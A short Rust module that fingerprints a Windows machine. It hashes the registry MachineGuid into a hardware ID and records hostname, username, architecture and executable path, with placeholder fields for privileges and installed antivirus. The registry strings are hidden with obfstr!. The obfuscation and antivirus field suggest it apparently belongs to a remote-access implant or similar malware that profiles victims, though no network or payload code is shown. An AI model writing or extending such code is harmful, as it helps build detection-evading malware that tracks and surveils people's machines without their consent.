use super::SystemInfo;
use sha2::{Digest, Sha256};

pub fn gather_system_info() -> SystemInfo {
    let hwid = machine_guid()
        .map(|g| hex::encode(Sha256::digest(g.as_bytes())))
        .unwrap_or_else(|| "unknown".to_string());

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string());

    SystemInfo {
        hwid,
        hostname,
        os: "windows".to_string(),
        arch: std::env::consts::ARCH.to_string(),
        username,
        privileges: "unknown".to_string(),
        av: vec![],
        exe_path: std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "unknown".to_string()),
    }
}

fn machine_guid() -> Option<String> {
    #[cfg(target_os = "windows")]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        RegKey::predef(HKEY_LOCAL_MACHINE)
            .open_subkey(obfstr::obfstr!(r"SOFTWARE\Microsoft\Cryptography"))
            .and_then(|k| k.get_value::<String, _>(obfstr::obfstr!("MachineGuid")))
            .ok()
    }
    #[cfg(not(target_os = "windows"))]
    None
}
